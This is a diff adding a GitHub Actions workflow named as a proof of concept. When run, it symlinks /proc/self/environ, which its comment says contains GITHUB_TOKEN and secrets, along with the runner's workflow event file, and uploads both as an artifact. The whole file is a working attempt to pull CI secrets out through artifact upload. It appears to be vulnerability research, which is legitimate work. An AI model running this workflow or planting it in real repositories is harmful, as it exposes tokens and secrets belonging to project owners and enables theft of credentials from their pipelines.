@@ -1,0 +1,30 @@
+name: Symlink Environ PoC
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: write
+
+jobs:
+  test-environ-symlink:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Create symlink to proc environ
+        run: |
+          # Symlink to /proc/self/environ (contains GITHUB_TOKEN, secrets)
+          ln -s /proc/self/environ runner-environ-leak
+          # Symlink to the workflow event payload
+          ln -s /home/runner/work/_temp/_github_workflow/event.json workflow-event-leak
+          ls -la runner-environ-leak workflow-event-leak
+
+      - name: Upload artifact with symlinks
+        uses: actions/upload-artifact@v4
+        with:
+          name: environ-proof
+          path: |
+            runner-environ-leak
+            workflow-event-leak
+          retention-days: 1
